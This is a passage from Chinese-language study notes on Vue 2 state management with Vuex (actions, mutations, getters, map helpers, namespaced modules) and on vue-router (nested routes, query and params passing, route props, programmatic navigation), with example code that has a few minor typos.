  ```js
  actiosn: {
      //简写
      jia(context, value) {
  		context.commit('JIA', value) // 同时也要定义mutation类型，一般大写，做个区分
      }
  }
  ```

  可以用对象的赋值解构写法

  ```js
  actiosn: {
      //简写
      // 第一个参数，也可能是dispatch，看实际情况
      // 第二个参数命名，一般写成payload，是dispatch时，自定义的任何类型的数据，
      jia({commit}, payload) { 
  		commit('JIA', payload) //不过payload一般根据实际情况，写成语义化的命名
      }
  }
  ```

  - 使用场景
    - 可以在组件初始化时，分发`action`调用`axios`发送请求获取数据

- 定义`mutation`类型

  ```js
  mutations: {
    JIA(state, payload) {
      // state，是对配置项state做了响应式处理之后的对象
      // value是传入的值
      state.sum += payload
    }
  },
  ```

  关于`mutation`命名的维护，可以单独放在`store/mutationTypes.js`文件中

  

  在组件中引入`state`中的数据

  ```vue
  <template>
    <div>
      <h2>{{$store.state.sum}}</h2>
      <button @click="myDispatch">click</button>
    </div>
  
  </template>
  <script>
  export default {
    data() {
      return {
        n: 1
      }
    },
    mounted() {
      console.log(this)
    },
    methods: {
      myDispatch() {
        this.$store.dispatch('jia', this.n)
      }
    }
  }
  </script>
  
  ```

- 如果`aciton`中没有其他的业务逻辑，组件中可以不调用`dispatch`方法，直接`commit`给`mutation`即可

  ```js
  this.$store.commit('JIA', this.n) // 传入mutation类型，并根据需要传入其他参数
  ```

### 5.1.5.`vuex`开发者工具的使用



### 5.1.6.`getters`配置项

当`state`中的数据需要经过加工后再使用时，可以使用`getters`加工

类似与计算属性：

定义

```js
  state: {
    sum: 0
  },
  getters: { // 用于将state中的数据进行加工
    bigSum(state) {
      return state.sum * 10 // 假设是非常复杂耗时的逻辑
    }
  },
```

使用

```vue
    <h2>{{$store.getters.bigSum}}</h2>
```

### 5.1.7.`mapState`和`mapGetters`

背景：我们在使用`store`中的数据时，需要写一堆`this.$store.state`的代码，现在要简化这部分操作

虽然可以把每个值写到计算属性中去，但有更好的写法：

- 计算属性的写法：

  ```js
  computed() {
      vcSum() {
          return this.$store.state.sum
      }
  }
  ```

- 更好的写法如下：

#### 5.1.7.1.`mapState`对象写法

- 组件中引入`mapState`

  ```js
  import {mapState} from 'vuex';
  ```

- 先看一下`mapState`的基本使用和返回值

  ```js
    mounted() {
      const x = mapState(
          {
            vcSum: 'sum',
            vcName: 'name',
            vcAge: 'age', // 属性值对应着state中定义的
          }
      )
      console.log(x, typeof x) // mapState的返回值是一个对象，可以在computed中解构赋值一下，方便使用
    },
  ```

- 计算属性中，解构赋值`mapState`的返回值

  - 得到的是`mappedState`的函数，会去`vuex`中的`state`中取对应的值作为该函数的返回值

  ```js
    computed: {
      ...mapState({
        vcSum: 'sum',
        vcName: 'name',
        vcAge: 'age', // 相当于在computed中定义了三个变量
      })
    },
  ```

- 使用

```vue
<template>
  <div class="about">
    <h1>This is an about page</h1>
    <h2>{{vcSum}}</h2>
    <h2>{{vcName}}</h2>
    <h2>{{vcAge}}</h2>
    <h2>{{$store.getters.bigSum}}</h2>
    <button @click="myDispatch">click</button>
  </div>

</template>
<script>
import {mapState} from 'vuex';

export default {
  data() {
    return {
      n: 1
    }
  },
  mounted() {
    const x = mapState(
        {
          vcSum: 'sum',
          vcName: 'name',
          vcAge: 'age',
        }
    )
    console.log(x, typeof x) // mapState的返回值是一个对象，可以在computed中解构赋值一下，方便使用
  },
  computed: {
    ...mapState({
      vcSum: 'sum',
      vcName: 'name',
      vcAge: 'age',
    })
  },
  methods: {
    myDispatch() {
      this.$store.dispatch('jia', this.n)
    }
  }
}
</script>

```

在`Vue`的开发中工具中，显示在`vuex bindings`部分

![image-20220601161628614](image-20220601161628614.png)

#### 5.1.7.2.`mapState`数组写法

上述的对象写法，虽然定义的变量，和`state`中定义的变量名称一致，但不能用对象的简写形式，因为值是字符串不是变量

```js
  computed: {
    ...mapState({sum: 'sum', name: 'name', age: 'age'})
  },
```

在`vue`中，把上述对象的形式，写成数组的形式，就相当于是简写形式了

生成相应计算属性的同时，也会去`state`中取值

```js
  computed: {
    ...mapState(['sum', 'name', 'age'])
  },
```

`store`对象的`state`属性中，有什么就可以写什么

同理`mapGetters`也是一样的写法：

```js
  computed: {
    ...mapState({bigSum: 'bigSum'})
  },
      
  或者
  
  computed: {
    ...mapState(['bigSum'])
  },
       
```

### 5.1.8.`mapActions`和`mapMutations`

优化`dispatch`和`commit`的写法，不用写`this.$store.commit('xx')`

之前的写法可以将`commit`写在`methods`里：

```js
  methods: {
    myCommit() {
      this.$store.commit('JIA', this.n)
    }
  }
```

现在可以通过`mapMutations`简写写法：

```js
import {mapMutations} from 'vuex';

export default {
    data() {
    	return {
            n: 1
        }  
    },
    methods: {
    	...mapMutations({myCommit: 'JIA'}) // 会生成myCommit方法，方法中会调用commit方法去联系mutations
    }
}
```

相当于生成了如下代码：

```js
// 相当于生成了如下代码：
myCommit(value) {
	this.$store.commit('JIA', value)
}
```

需要在使用的时候传递参数，否则传递的默认参数是`MouseEvent`

```vue
    <button @click="myCommit(n)">click</button>
```



上述是对象的写法，也可以写成数组的写法：

```js
    methods: {
    	...mapMutations(['JIA'])
    }
```

使用

```vue
    <button @click="JIA(n)">click</button>
```

同理，`mapActions`对应着`dispatch`

定义：

```js
import {mapActions} from 'vuex';

    methods: {
        // 对象写法
    	...mapActions({myDispatch:'jia'})
        
        // 数组写法
    	...mapActions(['jia'])
        
    }
```

使用：

```vue
    <button @click="myDispatch(n)">click</button>
或者
    <button @click="jia(n)">click</button>

```

值得注意的是，`mapActions`数组的写法，其实是将方法挂在的`vc`实例上，虽然看上去更为简单

但是在组件获取初始化数据，并且还是用`action-types`文件时，用对象写法会好些

### 5.1.9.多组件共享数据

在不同组件中使用`vuex`

### 5.1.10.`vuex`的模块化编码+`namespaced`

不同模块用到的共享数据，放在不同的对象中

```js

const moduleA = {
  namespaced: true,
  state: {
    name:'sai'
  },
  getters: {
  },
  mutations: {
  },
  actions: {
  },
  modules: {
  }
}

const moduleB = {
  state: {
  },
  getters: {
  },
  mutations: {
  },
  actions: {
  },
  modules: {
  }
}

```

使用`modules`配置项：

```js
export default new Vuex.Store({
    modules: {
        moduleA,
        moduleB
    }
})
```

模块化编码后，此时`store`里面有什么呢？

变化较大的是`state`对象，`state`中会包含各个自定义的模块

此时，之前利用`mapState`取数的写法，获取到的`state`对象直接就包含了属性名与属性值，但现在包含了`moduleA`、`moduleB`对象，里面才是属性名与属性值：

![image-20220601201019654](image-20220601201019654.png)

那么，此时模板怎么取到这个值呢？

`store`里的`state`身上，有什么我们就写什么

```vue
computed: {
	...mapState(['moduleA', 'moduleB'])
}
```

```vue
    <h2>{{moduleA.name}}</h2>
```

虽然可以取到数据了，但是写法有些麻烦，模板中我们只希望写`{{name}}`应该怎么写呢？

```vue
    <h2>{{name}}</h2>
```

想要上述写法生效，定义`module`时，需要额外新增一个`namespaced`配置项并设置成`true`：

```js
const moduleA = {
    namespaced: true,
    state:{
        name: 'sai'
    },
    actions:{},
    mutations:{},
    getters:{},
}
```

同时使用`mapState`取数时，指定模块名

```js
computed: {
	...mapState('moudleA', ['name'])
}
```

同理，模块化写法时，`mapActions`和`mapMutations`也要开启命名空间，在组件中使用时也要模块名

```js
methods: {
    ...mapMutations('moudleA', ['JIA'])
}
```



如果指定了命名空间，使用`this.$store.state`的写法，需要多写一层加上命名空间：

- 取数：

  - `state`中：`this.$store.state.moduleA.name`

  - `getters`中：`this.$store.getters['moduleA/name']`

    ![image-20220601205100324](image-20220601205100324.png)

- 提交：

  - `mutations`中：`this.$store.commit('moduleA/JIA', value)`
    - 写成这样是因为底层设计就是这样，会找有没有`/`分隔符
  - `actions`中：`this.$store.dispatch('moduleA/add', value)`
  
- 注意：

  - 如果在没有加`namspaced`命名空间的情况下，不同的模块还有相同的`mutation`，如果`commit`会都执行，不合理


### 5.1.11.`vuex`模块化编码最佳实践

#### 5.1.11.1.定义模块

- 不同模块都放在`store/modules`文件夹下

  ![image-20220622110840708](image-20220622110840708.png)

- 不同的模块每个`state`、`action`、`getters`和`mutation`都单独抽成一个`js`文件（放在一起代码太多时不好维护）

  - 为了便于识别，每个`state`或其它，命名前可以加模块名，如`homeState`

    如下形式，分别定义4个

    ```js
    const homeState = {
    
    }
    
    export default homeState
    ```

    后面使用`.default`属性获取文件导出内容时时，并不会用到`homeState`这个名字，也可以这样写

    `home/state.js`

    ```js
    export default {
        
    }
    ```

    这时只能根据文件名和路径名，才能判断这个文件是干嘛的了

  - 在`modules`同级目录，定义`index.js`整合所有的模块

    - 利用`webpack`中`require.context()`方法获取文件路径、利用`default`属性获取模块导出内容

      `moudles/index.js`

      ```js
      // require.context()方法时webpack内置方法，直接用
      const files = require.context('.', true, /\.js$/) // 搜索当前文件夹，及子文件夹中，以.js结尾的文件
      const modules = {}
      // keys()方法返回匹配的每个文件的相对路径，是个数组
      files.keys().forEach(key => {
          const path = key.replace(/\.\/|\.js/g, '') // 使用正则，把每个相对路径的 ./ 和.js 都替换成空字符串
          // path只剩下 home/state 这种和自身 index 了
          if (path == 'index') return // 路径是自己则不做任何处理
          let [moduleName, type] = path.split('/')
          if (!modules[moduleName]) {
              modules[moduleName] = {// 开始构造导出对象
                  namespaced: true // 构建命名空间配置 {namespaced: true}
              }
          }
          // 构建state/getters/actions/mutations配置项
          // files()方法的返回值一个Module类型的对象，其default属性值，就是每个文件导出的结果值
          modules[moduleName][type] = files(key).default //最终的modules对象，就是包含了每个配置项的模块对象
          console.log(modules)
          // moudles的打印结果 = {
          //     home: {
          //         namespaced: true,
          //         state:{},
          //         getters:{},
          //         actions:{},
          //         mutations:{}
          //     },
          //     search: {
          //         namespaced: true,
          //         state:{},
          //         getters:{},
          //         actions:{},
          //         mutations:{}
          //     }
          // }
      })
      // 这个结果，和我们一开始学vuex模块化编码是一致的
      export default modules;
      ```

  - 在公共的`index.js`中，解构赋值上面的`modules`对象，这样就不用一个一个导入一大堆模块了

    - 另外，`vue-router`中不建议使用使用批量导入的方式，因为没有一个明确的规范

    ```js
    import Vue from 'vue'
    import Vuex from 'vuex'
    import modules from './modules/index.js'
    
    Vue.use(Vuex)
    
    export default new Vuex.Store({
        modules: {
            ...modules
        }
    })
    
    ```

- 公共的状态在`store/index.js`中维护，如`websocket`等

#### 5.1.11.2.使用`createNamespacedHelpers`简化`map*`写法

取数的数量越多，这种写法越清爽，提交`actions`和`mutations`同理

`test.vue`

```vue
<script>
import {createNamespacedHelpers} from 'vuex';

let mapsObj = createNamespacedHelpers('home') // 返回值是home模块对应的，mapState/mapGetters/mapActions/mapMutaions的一个对象
let {mapState: mapHomeState, mapActions: mapHomeActions} = createNamespacedHelpers('home') // 取mapState，并重命名避免多个模块命名冲突
let {mapState: mapSearchState} = createNamespacedHelpers('search')

export default {
  name: "TypeNav",
  mounted() {
    // this.$store.dispatch('home/categoryList')
    console.log(mapHomeState(['message']))
    this.categoryList()
  },
  computed: {
    ...mapHomeState(['message']) // 此时取值不用再指定第一个参数home模块名了，模板中可以直接使用{{message}}
  },
  methods: {
    ...mapHomeActions(['categoryList'])
  }
}
</script>
```

`store/modules/home/actions.js`

```js
import {reqCategoryList} from '@/api/home.js'

const homeActions = {
    async categoryList({commit}) {
        let res = await reqCategoryList()
        if(res.code == 200) {
            // ...
        }
        console.log(res)
    }
}

export default homeActions
```

#### 5.1.11.3.`actions`和`mutaion`s的`types`的统一管理

上一小节我们是直接提交的`action`，如果数据太多的话，不太好管理命名



根据需求创建`action-types.js`和`mutation-types.js`

数据少的的话，都放在`mutation-types.js`里也不是不行

`store/mutation-types.js`

```js
// 所有的名字都列在这里
// actions
export const ACTION_CATEGORYLIST = 'ACTION_CATEGORYLIST' // 常量都大写



// mutations
export const MUTATION_CATEGORYLIST = 'MUTATION_CATEGORYLIST'
```

然后在用到的子模块的`action.js`或`mutation.js`中导入

`home/action.js`

```js
import {reqCategoryList} from '@/api/home.js'
import * as Types from '@/store/action-types.js'

const homeActions = {
    async [Types.ACTION_CATEGORYLIST]({commit}) {
        let result = await reqCategoryList()
        if(result.code == 200) {
            commit(Types.MUTATION_CATEGORYLIST, result.data)
        }
        console.log(result)
    }
}

export default homeActions
```

`home/mutation.js`

```js
import * as Types from '@/store/action-types'
const homeMutations = {
    [Types.MUTATION_CATEGORYLIST](state, categoryList) {
        state.categoryList = categoryList
    }
}

export default homeMutations
```

`home/state.js`

```js
const homeState = {
    categoryList: [] // 定义的数据类型，要和实际返回的数据类型保持一致
}

export default homeState
```



在组件中使用

`test.vue`

```vue
<template>
	<div>
		<h2>
            {{categoryList}}
    	</h2>        
    </div>
</template>
<script>
import {createNamespacedHelpers, mapState} from 'vuex';
import * as Types from '@/store/action-types.js'
let mapsObj = createNamespacedHelpers('home')
let {mapState: mapHomeState, mapActions: mapHomeActions} = createNamespacedHelpers('home') 
export default {
  name: "TypeNav",
  mounted() {
    console.log(mapHomeState(['message']))
    this[Types.ACTION_CATEGORYLIST]() // 注意写法
  },
  computed: {
    ...mapHomeState(['categoryList'])
  },
  methods: {
    ...mapHomeActions([Types.ACTION_CATEGORYLIST])
  }
}
</script>
```

看另外一个案例

`index.vue`

```vue
<template>
	<div>
        <HomeHeader v-model="currentCategory"></HomeHeader>
    </div>
</template>
<script>
    import HomeHeader from './home-header.vue'
    import {createNamespacedHelpers} from 'vuex'
    import * as Types from '@/store/action-tpes'
    // 这里拿到的都是home模块下的
    let {mapState,mapMutations} = createNamespacedHelpers('home')
    export default {
        methods: {
            ...mapMutations([Type.SET_CATEGORY])
        },
        computed: {
            ...mapState(['category']),
            currentCategory: {
                get() { // 取值
                    return this.category
                },
                set(value) { // 修改状态
                    this[Types.SET_CATEGORY](value)
                }
            }
        }
    }
</script>
```



# 6.`vue-router`

路由就是一组`key-value`的对应关系，对于前端来说，`key`就是路径，`value`就是组件

多个路由，需要经过路由器的管理

## 6.1.相关理解

### 6.1.1.`vue-router`的理解

`vue`的一个插件库，专门用来实现`SPA`应用

### 6.1.2.对`SPA`应用的理解

- 单页`web`应用（`singel page web application, SPA`）
- 整个页面只有<span style="color:red">一个完整的页面</span>
- 点击页面中的导航链接<span style="color:red">不会刷新</span>页面，只会做页面的<span style="color:red">局部更新</span>
- 数据需要通过`ajax`获取

### 6.1.3.路由的理解

- 什么是路由？
  - 一个路由就是一个映射关系（`key-value`）
  - `key`为路径，`value`可能是`function`或`component`

- 路由分类
  - 后端路由：
    - 理解：`value`是`function`，用于处理客户端提交的请求
    - 工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据
  - 前端路由
    - 理解：`value`是`component`，用于展示页面内容
    - 工作过程：当浏览器的路径发生改变时，对应的组件就会显示



## 6.2.基本路由



- 引入`vue-router`，并配置路径和组件的映射关系

  `router/index.js`

  ```js
  import Vue from 'vue'
  import VueRouter from 'vue-router'
  import HomeView from '../views/HomeView.vue'
  
  // 解决重复点击的警告问题
  let originPush = VueRouter.prototype.push;
  VueRouter.prototype.push = function (location, resolve, reject) {
    if (resolve && reject) {
      originPush.call(this, location, resolve, reject);
    } else {
      originPush.call(
        this,
        location,
        () => {},
        () => {}
      );
    }
  };
  
  let originReplace = VueRouter.prototype.replace;
  VueRouter.prototype.replace = function (location, resolve, reject) {
    if (resolve && reject) {
      originReplace.call(this, location, resolve, reject);
    } else {
      originReplace.call(
        this,
        location,
        () => {},
        () => {}
      );
    }
  };
  
  
  Vue.use(VueRouter) // Vue实例对象上，会多出一个$store对象
  
  const routes = [ // 配置路径和组件的对应关系
    {
      path: "/",
      redirect: "/home", // 路由重定向
    },
    {
      path: '/home',
      name: 'home',
      component: HomeView
    },
    {
      path: '/about',
      name: 'about',
      // route level code-splitting
      // this generates a separate chunk (about.[hash].js) for this route
      // which is lazy-loaded when the route is visited.
      component: () => import(/* webpackChunkName: "about" */ '../views/AboutView.vue')
    }
  ]
  
  const router = new VueRouter({
    routes
  })
  
  export default router
  
  ```
  
  `main.js`
  
  ```js
  import Vue from 'vue'
  import App from './App.vue'
  import router from './router'
  import store from './store'
  
  Vue.config.productionTip = false
  
  new Vue({
    router,
    store,
    render: h => h(App)
  }).$mount('#app')
  
  ```
  
  `router`对象：

​		![image-20220601214649940](image-20220601214649940.png)

- `router-link`：指定组件的跳转菜单

  - 原始`html`中，我们使用`a`标签进行页面的跳转，如果现在想要实现点击切换路径，需要使用`router-link`标签，并配置一个`to`属性，值为路径。并且有一个`active-class`属性，点击时会有该属性值。

  - `router-link`最终被渲染成`a`标签，所以需要有编程式导航，可以指定其他标签实现路由跳转

  - 如果不指定`to`属性，则不会被渲染成`a`标签

    ```vue
    <router-link active-class="active" to="/home">Home</router-link>
    ```

  - 值得注意的是，`router-link`是一个组件，当用来写导航栏时，并且导航栏还有个`hover`的背景色样式，导航栏之前快速切换的话，页面会卡顿，因为`router-link`是一个组件，要花时间来渲染

    - 当服务器数据返回后，要循环渲染很多`router-link`（1000+），会消耗很多内存，不卡才怪了

      ```html
              <div class="all-sort-list2">
                  <!-- 一级菜单-->
                  <div class="item"
                       v-for="(c1, index) in categoryList"
                       :key="c1.categoryId"
                       :class="{'cur': currentIndex == index}"
                       @mouseenter="changeIndex(index)"
                  >
                    <h3>
                      <!-- v-for中不使用router-link声明式导航 -->
                      <a href="" @click="goSearch">{{c1.categoryName}}</a> 
                    </h3>
                    <!-- 二、三级菜单 -->
                    <div class="item-list clearfix" :style="{display: currentIndex==index ? 'block': 'none'}">
                      <div class="subitem" v-for="(c2, index) in c1.categoryChild" :key="c2.categoryId">
                        <dl class="fore">
                          <dt>
                            <a href="" @click="goSearch">{{c2.categoryName}}</a>
                          </dt>
                          <dd>
                            <em v-for="(c3, index) in c2.categoryChild" :key="c3.categoryId">
                              <a href="" @click="goSearch">{{c3.categoryName}}</a>
                            </em>
                          </dd>
                        </dl>
                      </div>
                    </div>
                  </div>
                </div>
      ```

      

  - 使用声明式导航，也要注意`click`事件不要直接绑定在渲染元素上，要利用事件的委派（冒泡），`click`事件写在就近的父元素上

    - 问题1：父元素里除了目标`a`元素，还有其它元素，怎么确定点击的就是`a`标签呢

      ```html
      <div class="all-sort-list2" @click="goSearch">
          <!-- ... -->
      </div>
      ```

      - 解决方案：利用自定义属性

        ```html
        <div class="all-sort-list2" @click="goSearch">
            <!-- ... -->
            <a :data-categoryName="c1.categoryName">{{c1.categoryName}}</a> 
        </div>
        ```

        ![image-20220623171420245](image-20220623171420245.png)

        此时所有的`a`标签，就有了`data-categoryname`属性，注意浏览器自动转成了小写

        利用`event.target`获取到所有的子节点，然后带有`data-categoryName`属性的节点一定是`a`标签

        ```js
        let element = event.target
        console.log(element)
        ```

        ![image-20220623172732461](image-20220623172732461.png)

        那么，怎么拿到节点属性呢？使用`dataset`属性，可以获取到节点的属性和自定义属性，

        ```js
              let dataset = event.target.dataset
              console.log(dataset)
        ```

        ![image-20220623172823730](image-20220623172823730.png)

        这是一个对象，解构赋值获取到即可

    - 问题2：点击时要路由传参，怎么获得`v-for`的参数呢

      - 可以再给不同级别的绑定另外的自定义属性，`category1id`、`category2id`、`category3id`

        ```html
        <a :data-categoryName="c1.categoryName" :data-category1id="c1.categoryId">{{c1.categoryName}}</a>
        
        <a :data-categoryName="c2.categoryName" :data-category2id="c2.categoryId">{{c2.categoryName}}</a>
        
        <a :data-categoryName="c3.categoryName" :data-category3id="c3.categoryId">{{c3.categoryName}}</a>
        
        ```

        跳转的方法中，进行参数获取，并合并

        ```js
        // 解构赋值
        
        ```

        

- `router-view`：指定组件的呈现位置

  ```vue
  <template>
    <div id="app">
      <nav>
        <router-link to="/">Home</router-link> |
        <router-link to="/about">About</router-link>
      </nav>
      <router-view/>
    </div>
  </template>
  ```

- 使用注意：

  - 目录
    - 由路由器管理的组件称为路由组件，一般放在`src/pages`目录
    - 而之前的`components`文件夹，一般放一般组件
  - 不用的路由组件，其实是被销毁了，可以用`beforeDestroy`钩子验证；刚出来的路由组件，又会被重新挂载，可以用`mounted`钩子验证
  - 路由组件的实例身上，会多出`$route`和`$router`对象
    - `$route`对应单个路由组件的信息，包含了配置的`path`等信息
    - `$router`对应整个应用的路由器，只有一个，可以通过组件的`$router`属性获取到

## 6.3.嵌套（多级）路由

使用`children`实现多级路由

```js
import Vue from 'vue'
import VueRouter from 'vue-router'
import HomeView from '../views/HomeView.vue'
import News from '../views/News.vue'
import Message from '../views/Message.vue'

Vue.use(VueRouter) // Vue实例对象上，会多出一个$store对象

const routes = [ // 配置路径和组件的对应关系
  {
    path: '/',
    name: 'home',
    component: HomeView,

  },
  {
    path: '/about',
    name: 'about',
    component: () => import(/* webpackChunkName: "about" */ '../views/AboutView.vue'),
    children: [
        {
            path: 'news', // 多级路由的path，不用再加/符号了
            component: News
        },
        {
            path: 'message',
            component: Message
        }
    ]
  }
]

const router = new VueRouter({
  routes
})

export default router

```

使用：

```vue
    <router-link to="/about/news">news</router-link><br/> <!-- 写路径时，要带着父亲的路径-->
    <router-link to="/about/message">message</router-link>
    <router-view></router-view> <!-- 子路由由再写一个router-veiw -->
```

嵌套路由默认激活子路由的第一个路由



## 6.4.路由传参

### 6.4.1.`query`参数

#### 6.4.1.1.字符串写法

我们再给`Message`组件嵌套一层路由

```js
{
    path: 'Message',
    component: Message,
    children: [
        {
            path: 'detail',
            component: Detail
        }
    ]
}
```

定义`Detail`组件

```vue
<template>
  <div>
    <ul>
      <li>消息编号：？？？</li>
      <li>消息标题：？？？</li>
    </ul>
  </div>
</template>

<script>
    export default {
        name: "Detail",

    }
</script>

<style scoped>

</style>
```

在`Message`组件中使用

```vue
<template>
  <div>
    <h2>Message</h2>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <router-link to='/about/message/detail'>{{m.title}}</router-link>
      </li>
    </ul>
    <router-view></router-view>
  </div>
</template>

<script>
    export default {
        name: "Message",
        data() {
            return {
                messageList: [
                    {id:'001',title:'message 01'},
                    {id:'002',title:'message 02'},
                    {id:'003',title:'message 03'},
                ]
            }
        }
    }
</script>

<style scoped>

</style>
```

效果：

![image-20220602062419576](image-20220602062419576.png)

现在不管是点`message01`，还是`message02`，路由一直是`detail`，内容也不会发生变化

我们希望，在路由跳转的时候，可以传递参数，并且将我们传递的参数展示出来

跳转路由的可以携带两种参数（`query`和`params`参数）

- `Detail`组件挂载时，我们打印一下`$route`

  ![image-20220602062743888](image-20220602062743888.png)

  - `query`参数，在`route`对象身上

我们改写下`<Message>`组件的`<router-link`中的`to`的写法

```vue
        <router-link to="/about/message/detail?id=666&title=hello">{{m.title}}</router-link>
```

此时`query`属性，会添加我们写的路径的查询参数（转为对象的形式）：

![image-20220602063217057](image-20220602063217057.png)

很明显，我们不能写死，我们使用单向绑定，结合模板字符串，将`Message`组件中的数据，作为参数传递给`Detail`组件

```vue
        <router-link :to="`/about/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>
```

`Detail`组件中，利用`query`属性接收相应的值

```vue
<template>
  <div>
    <ul>
      <li>消息编号：{{$route.query.id}}</li>
      <li>消息标题：{{$route.query.title}}</li>
    </ul>
  </div>
</template>
```

![image-20220602063731145](image-20220602063731145.png)

但是，上面的写法太恶心，有简易写法

#### 6.4.1.2.对象写法

```vue
        <router-link :to="{
            path: '/about/message/detail',
            query: {
                id: m.id,
                title: m.title
            }
        }">{{m.title}}</router-link>
```

#### 6.4.1.3.命名路由

给路由起个名字，使用`name`配置项

```js
    {
        name: 'guanyu', // 使用name配置项，给路由起个名字
        path: '/about',
        component: () => import(/* webpackChunkName: "about" */ '../views/AboutView.vue'),
        children: [
            {
                name: 'xinwen'
                path: 'news',
                component: News
            },
            {
                path: 'Message',
                component: Message,
                children: [
                    {
                        name: 'xiangqing'
                        path: 'detail',
                        component: Detail
                    }
                ]
            }
        ]
    }
```

那有啥用呢？

我们之前使用`to`的对象写法时，一层层路径，写法还是有些繁琐，配置了`name`之后，就可以直接写`name`值了

```vue
        <router-link :to="{
            name: 'xiangqing', // 写法上，不再根据path去匹配路径
            query: {
                id: m.id,
                title: m.title
            }
        }">{{m.title}}</router-link>
```

同理，一级路由也可以是如下写法（注意要加冒号），但没必要

```vue
      <router-link :to="{name:'guanyu'}">About</router-link>
```

### 6.4.2.`params`参数

#### 6.4.2.1.字符串写法

```vue
        <router-link :to="`/about/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>
```

同时使用占位符，配置`detail`组件`path`项

```js
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title', //配置path项
                        component: Detail
                    }
                ]
```

并在`Detail`组件中，使用`params`取数

```vue
      <li>消息编号：{{$route.params.id}}</li>
      <li>消息标题：{{$route.params.title}}</li>
```

效果如下：

![image-20220603144621235](image-20220603144621235.png)

#### 6.4.2.2.对象写法

```vue
        <router-link :to="{
           name: 'xiangqing',
           params: { // 修改key为params
               id: m.id,
               title: m.title
           }
        }">{{m.title}}</router-link>
```

注意，如果是`params`的对象写法，只能用`name`，不能用`path`

### 6.4.3.路由的`props`配置

我们在`Detail`组件中，可以通过`$route.params.id`拿到路由的位置参数，但是每拿一次都要写这么多，虽然可以通过计算属性来封装，但还是有些麻烦

可以通过路由的`props`配置项，让路由组件更方便的收到参数

#### 6.4.3.1.`props`值是对象

`router/index.js`

```js
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props: {id:666} // props值是对象，该对象中所有key-value的组合最终都会通过props传给Detail组件，Detail组件通过props配置项获取，这样不用引入`$route`了
                    }
                ]
```

`Detail.vue`

```vue
<li>props传值：{{id}}</li>

......

props: [
	'id'
]
```

`Detail`组件中，可以通过`props`拿到路由的传值，效果：

![image-20220603211347076](image-20220603211347076.png)

#### 6.4.3.2.`props`值是布尔值

前提：`<router-link>`是以`params`传参的

`router/index.js`

```js
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props: true // props值为布尔值，布尔值为true则把路由收到的所有params参数通过props传给Detail组件
                    }
                ]
```

`Detail.vue`

```vue
<li>props传值：{{id}} - {{title}}</li>


......

props: [ // 定义的props变量，和params位置参数保持一致
    'id',
    'title'
]
```

`Detail`组件中，可以通过`props`拿到路由的传值，效果：

![image-20220603211914461](image-20220603211914461.png)

#### 6.4.3.3.`props`值是函数

`router/index.js`

```js
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props() { // props值为函数，该函数返回的对象的每一组key-value都会通过props传给Detail组件
                            return {
                                id: 666,
                                title: 'sai'
                            }
                        }
                    }
                ]
```

`Detail.vue`

```vue
<li>props传值：{{id}} - {{title}}</li>


......

props: [ // 定义的props变量，和params位置参数保持一致
    'id',
    'title'
]
```

`Detail`组件中，可以通过`props`拿到路由的传值，效果：

![image-20220603212510054](image-20220603212510054.png)

`props`的函数形式，会有一个`$route`参数，就是组件的`$route`属性

```js
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props($route) { // props值为函数，该函数返回的对象的每一组key-value都会通过props传给Detail组件
                            return {
                            	id: $route.params.id, // 或者是$route.query.id，都可以
                                title: $route.params.title
                            }
                        }
                    }
                ]
```

我们知道，`$route`是一个对象，可以用对象的解构赋值简写：

```js
props({params}) { // 或者是query，取决于传参的方式
    return {
        id: params.id,
        title: params.title
    }
}
```

由于`query`还是对象，可以用对象解构赋值的连续写法：

```js
props({params: {id ,title}}) { // 或者是query，取决于传参的方式
    return {
        id: id,
        title: title
    }
}
```

再使用对象的简写形式：

```js
props({params: {id ,title}}) { // 或者是query，取决于传参的方式
    return {id, title}
}
```



#### 6.4.3.4.小结：路由的`props`配置

```js
{
	name: 'xiangqing',
    path: 'detail/:id',
    component: Detail,
    // 第一种写法：props值是对象，该对象中所有key-value的组合最终都会通过props传给Detail组件，Detail组件通过props配置项获取，这样不用引入`$route`了
    // props: {a:900}
        
    // 第二种写法：props值为布尔值，布尔值为true则把路由收到的所有params参数通过props传给Detail组件
    // props: true
        
    // 第三种写法：props值为函数，该函数返回的对象的每一组key-value都会通过props传给Detail组件
    props($route) {
        return {
            id: $route.query.id,
            title: $route.query.title
        }
    }
        
}
```

### 6.4.4.`router-link`的`replace`属性

这一小节，我们关注一下，路由对浏览器历史记录的影响

浏览器使用栈结构来保存历史记录，使用`<router-link>`相当于`push`操作，一条一条往栈结构中写数据

还有`replace`操作，替换掉当前的历史记录



- 作用：控制路由跳转时操作浏览器历史记录的模式
- 浏览器的历史记录有两种写入方式：分别是`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时默认为`push`
- 如何开启`replace`模式：`<router-link replace ...>News</router-link>`

## 6.5.编程式路由导航

### 6.5.1.使用方法实现路由跳转

`$router`是`VueRouter`的实例对象，它身上真正有用的方法，是放在原型对象上的

`push`和`replace`方法同样可以实现路由的跳转

```vue
<template>
  <div>
    <h2>Message</h2>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- <router-link :to="`/about/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link> -->
        <!-- <router-link :to="{
           name: 'xiangqing',
           params: {
               id: m.id,
               title: m.title
           }
        }">{{m.title}}</router-link> -->
        <button @click="showInfo(m)">click</button>
      </li>
    </ul>
    <router-view></router-view>
  </div>
</template>

<script>
    export default {
        name: "Message",
        data() {
            return {
                messageList: [
                    {id:'001',title:'message 01'},
                    {id:'002',title:'message 02'},
                    {id:'003',title:'message 03'},
                ]
            }
        },
        methods: {
          showInfo(m) {
            this.$router.push({
                         name: 'xiangqing',
           params: {
               id: m.id,
               title: m.title
           }
            })
          }
        }
    }
</script>

<style scoped>

</style>
```

`back`方法对应浏览器的回退，`forward`方法方法对象浏览器的前进，这两个方法可以操作浏览器的历史记录

`go`方法接收一个数字，如果是正数`n`，表示往前连续走`n`步，后退的话用`-n`表示

